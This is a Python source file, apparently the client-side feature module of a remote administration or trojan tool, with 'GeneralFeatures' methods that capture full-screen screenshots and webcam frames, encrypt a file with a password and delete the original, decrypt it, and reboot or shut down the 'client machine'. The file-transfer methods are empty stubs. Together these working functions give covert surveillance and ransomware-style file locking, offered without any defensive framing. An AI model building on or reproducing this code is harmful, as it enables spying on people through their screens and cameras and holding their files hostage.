import io
import os
import cv2
import subprocess
from PIL import ImageGrab
from datetime import datetime
from cryptography.exceptions import InvalidTag
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


class GeneralFeatures:

    def __init__(self):
        self.now = datetime.now()
        self.salt_size = 16  # bytes
        self.nonce_size = 12  # bytes for AES-GCM
        self.iterations = 100000  # PBKDF2 iterations
        self.hash_alg = hashes.SHA256()


    def screenshot(self, resize=None, quality=70):
        img = ImageGrab.grab()  # full screen
        if resize:
            img.thumbnail(resize)
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=quality)
        return buf.getvalue()


    def send_file(self):
        pass


    def receive_file(self):
        pass


    def camshot(self):
        cap = cv2.VideoCapture(0)  # 0 = default camera
        if not cap.isOpened():
            raise RuntimeError("Could not open webcam")
        ret, frame = cap.read()
        cap.release()
        if not ret:
            raise RuntimeError("Failed to capture frame")
        ret, buf = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
        if not ret:
            raise RuntimeError("JPEG encoding failed")
        return buf.tobytes()


    # Derive a 32-byte AES key from a password and salt
    def _derive_key(self, password: str, salt: bytes) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=self.hash_alg,
            length=32,
            salt=salt,
            iterations=self.iterations,
        )
        return kdf.derive(password.encode('utf-8'))


    # Encrypt file
    def encrypt_file(self, filename, password):
        with open(filename, 'rb') as f:
            data = f.read()
        # Generate random salt and nonce
        salt = os.urandom(self.salt_size)
        nonce = os.urandom(self.nonce_size)

        key = self._derive_key(password, salt)
        aesgcm = AESGCM(key)
        ciphertext = aesgcm.encrypt(nonce, data, None)
        encrypted_filename = "(Encrypted)_" + filename
        with open(encrypted_filename, 'wb') as f:
            f.write(salt + nonce + ciphertext)
        os.remove(filename)
        return encrypted_filename


    # Decrypt File
    def decrypt_file(self, filename, password):
        with open(filename, 'rb') as f:
            data = f.read()
        salt = data[:self.salt_size]
        nonce = data[self.salt_size:self.salt_size + self.nonce_size]
        ciphertext = data[self.salt_size + self.nonce_size:]
        key = self._derive_key(password, salt)
        aesgcm = AESGCM(key)

        try:
            plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        except InvalidTag:
            raise ValueError("Wrong password or corrupted file")
        # Remove "(Encrypted)_"
        out_filename = os.path.join(
            os.path.dirname(filename),
            os.path.basename(filename).removeprefix("(Encrypted)_")
        )
        with open(out_filename, 'wb') as f:
            f.write(plaintext)
        os.remove(filename)
        return out_filename


    # reboot client machine
    def reboot(self):
        try:
            subprocess.run(["shutdown", "/r", "/t", "0"], check=True)
            return "[+] System rebooting..."
        except Exception as e:
            return f"[-] Reboot failed: {e}"


    # shutdown client machine
    def shutdown(self):
        try:
            subprocess.run(["shutdown", "/s", "/t", "0"], check=True)
            return "[+] System shutting down..."
        except Exception as e:
            return f"[-] Shutdown failed: {e}"




